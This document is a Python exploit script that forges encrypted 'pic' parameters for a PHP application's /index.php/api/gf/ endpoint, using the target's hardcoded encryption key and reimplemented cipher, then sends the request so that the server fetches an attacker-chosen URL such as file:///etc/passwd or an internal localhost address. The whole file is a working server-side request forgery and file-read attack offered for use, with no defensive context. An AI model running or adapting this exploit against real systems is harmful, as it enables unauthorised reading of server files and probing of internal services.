import base64
import hashlib
import time
import random
import requests

# Encryption key (defined in the vulnerable target)
Mc_Encryption_Key = 'bD2voYwPpNuJ7B8'

def sys_auth(string, operation=0, key='', expiry=0):
    """
    Custom encryption function used by the vulnerable application.
    This function both encrypts and decrypts based on the 'operation' parameter.
    """
    ckey_length = 4
    key = hashlib.md5((key or Mc_Encryption_Key).encode()).hexdigest()
    keya = hashlib.md5(key[:16].encode()).hexdigest()
    keyb = hashlib.md5(key[16:].encode()).hexdigest()

    if operation == 1:
        keyc = string[:ckey_length]
    else:
        keyc = ''.join(random.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') for _ in range(ckey_length))

    cryptkey = (keya + hashlib.md5((keya + keyc).encode()).hexdigest())
    key_length = len(cryptkey)

    if operation == 1:
        string = base64.b64decode(string[ckey_length:].replace('-', '+') + '==')
    else:
        expiry_time = '%010d' % (expiry + int(time.time()) if expiry else 0)
        tmp_md5 = hashlib.md5((string + keyb).encode()).hexdigest()[:16]
        string = (expiry_time + tmp_md5 + string).encode()

    box = list(range(256))
    rndkey = [ord(cryptkey[i % key_length]) for i in range(256)]

    j = 0
    for i in range(256):
        j = (j + box[i] + rndkey[i]) % 256
        box[i], box[j] = box[j], box[i]

    a = j = 0
    result = bytearray()
    for byte in string:
        a = (a + 1) % 256
        j = (j + box[a]) % 256
        box[a], box[j] = box[j], box[a]
        result.append(byte ^ box[(box[a] + box[j]) % 256])

    if operation == 1:
        result = result.decode(errors='ignore')
        if (result[:10] == '0' * 10 or int(result[:10]) > int(time.time())) and \
           result[10:26] == hashlib.md5((result[26:] + keyb).encode()).hexdigest()[:16]:
            return result[26:]
        else:
            return ''
    else:
        return keyc + base64.b64encode(result).decode().replace('+', '-').replace('=', '')

def main():
    print("==== Vulnerability Exploit Script ====\n")
    target = input("Enter the target URL (e.g., http://target.com): ").strip()
    payload_url = input("Enter the payload URL (e.g., file:///etc/passwd or http://localhost): ").strip()

    # Encrypt the payload URL
    pic = sys_auth(payload_url, operation=0)
    # Construct the final exploit URL
    final_url = f"{target}/index.php/api/gf/?pic={pic}"

    print("\n[+] Generated Exploit URL:")
    print(final_url)

    try:
        response = requests.get(final_url, timeout=10)
        print("\n[+] Response content (first 500 characters):\n")
        print(response.text[:2000])
    except Exception as e:
        print(f"[-] Failed to send request: {e}")

if __name__ == "__main__":
    main()
